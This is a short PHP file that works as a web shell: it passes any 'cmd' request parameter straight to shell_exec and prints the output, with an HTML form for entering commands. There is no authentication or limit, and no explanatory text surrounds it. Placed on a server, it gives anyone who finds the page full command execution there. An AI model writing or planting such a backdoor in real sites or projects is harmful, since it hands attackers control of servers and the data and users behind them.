<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>

<form method="POST">
    <input type="text" name="cmd" placeholder="Enter command" />
    <input type="submit" value="Execute" />
</form>
